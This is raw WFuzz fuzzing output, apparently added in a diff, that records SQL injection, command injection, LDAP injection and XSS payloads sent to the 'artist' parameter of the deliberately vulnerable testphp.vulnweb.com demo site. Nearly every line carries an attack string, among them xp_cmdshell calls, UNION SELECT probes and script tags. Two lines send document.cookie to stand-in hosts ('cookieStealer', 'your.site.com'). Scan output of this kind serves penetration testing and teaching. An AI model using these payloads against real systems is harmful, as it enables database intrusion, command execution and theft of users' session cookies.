+       56            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=limit
+       57            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=order%20by
+       58            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=delete
+       59            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=asc
+       60            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=desc
+       61            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=update
+       62            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=distinct
+       63            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=having
+       64            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=replace
+       65            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=truncate
+       66            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=like
+       67            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=handler
+       68            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='%20or%20username%20like%20'%
+       69            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='%20or%20uname%20like%20'%
+       70            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=bfilename
+       71            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='%20or%20userid%20like%20'%
+       72            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='%20or%20uid%20like%20'%
+       73            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='%20or%20user%20like%20'%
+       74            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=exec%20xp
+       75            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=exec%20sp
+       76            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=';%20exec%20master..xp_cmdshell
+       77            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=';%20exec%20xp_regread
+       78            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=--sp_password
+       79            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=t'exec%20master..xp_cmdshell%20'nslookup%20www.google.com'--
+       80            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=\x27UNION%20SELECT
+       81            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='%20UNION%20ALL%20SELECT
+       82            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='%20UNION%20SELECT
+       83            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='||UTL_HTTP.REQUEST
+       84            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='%20or%20(EXISTS)
+       85            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='%20(select%20top%201
+       86            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=1;SELECT%20*
+       87            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=to_timestamp_tz
+       88            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='%20or%201=1
+       89            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=%20$(sleep%2050)
+       90            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=char%4039%41%2b%40SELECT
+       91            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=tz_offset
+       92            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=&lt;&gt;&quot;'%;)(&amp;+
+       93            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=&apos;%20OR
+       94            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=%27%20or%201=1
+       95            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='sqlattempt1
+       96            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=(sqlattempt2)
+       97            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=*(|(mail=*))
+       98            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=*(|(objectclass=*))
+       99            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=%2A%28%7C%28objectclass%3D%2A%29%29
+      100            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=|
+      101            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=%7C
+      102            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=*|
+      103            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=%2A%28%7C%28mail%3D%2A%29%29
+      104            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=%2A%7C
+      105            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=(
+      106            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=%28
+      107            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=%26
+      108            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=%29
+      109            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=)
+      110            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=
+      111            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=!
+      112            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=%21
+      113            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=x'%20or%201=1%20or%20'x'='y
+      114            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=/
+      115            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=//*
+      116            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=//
+      117            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=*/*
+
+WFuzz -- XSS Injection, URL = http://testphp.vulnweb.com/artists.php/artists.php
+=======================================================================================================================================
+ClusterID        Response         Lines  Words    Chars         Error    URL
+=======================================================================================================================================
+        1            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=\";alert('XSS');//
+        2            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=%3cscript%3ealert(document.cookie);%3c%2fscript%3e
+        3            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=%3cscript%3ealert("WXSS");%3c/script%3e
+        4            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<<script>alert("WXSS");//<</script>
+        5            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='><script>alert(document.cookie);</script>
+        6            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
+        7            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='><script>alert(document.cookie)</script>
+        8            200          104 L     364     4735         None    http://testphp.vulnweb.com/artists.php/artists.php?artist="><script>"
+        9            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<script>alert("WXSS")</script>
+       10            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<script>alert(document.cookie)</script>
+       11            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=&ltscript&gtalert(document.cookie);&ltscript&gtalert
+       12            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<xss><script>alert('WXSS')</script></vulnerable>
+       13            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=&ltscript&gtalert(document.cookie);</script>
+       14            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<IMG%20SRC='javascript:alert(document.cookie)'>
+       15            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<IMG%20SRC="javascript:alert('WXSS');">
+       16            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<IMG%20SRC="javascript:alert('WXSS')"
+       17            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<IMG%20SRC=JaVaScRiPt:alert('WXSS')>
+       18            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<IMG%20SRC=`javascript:alert("'WXSS'")`>
+       19            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<IMG%20SRC=javascript:alert('WXSS')>
+       20            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<IMG%20SRC=javascript:alert(&quot;WXSS&quot;)>
+       21            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<IMG%20"""><SCRIPT>alert("WXSS")</SCRIPT>">
+       22            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<IMG%20SRC="jav
+       23            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<IMG%20SRC="jav
+       24            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<IMG%20SRC=javascript:alert(String.fromCharCode(88,83,83))>
+       25            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<IMG%20SRC="jav
+       26            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<IMG%20SRC="%20
+       27            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<IMG%20LOWSRC="javascript:alert('WXSS')">
+       28            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<IMG%20DYNSRC="javascript:alert('WXSS')">
+       29            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>
+       30            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<IMG%20SRC=
+       31            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<IMG%20SRC=
+       32            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
+       33            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=<IMG%20SRC=
+       34            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist="><script>document.location='http://cookieStealer/cgi-bin/cookie.cgi?'+document.cookie</script>
+       35            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
+       36            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
+       37            200          106 L     379     4853         Error identified: Warning: mysql_fetch_array()  http://testphp.vulnweb.com/artists.php/artists.php?artist='';!--"<XSS>=&{()}
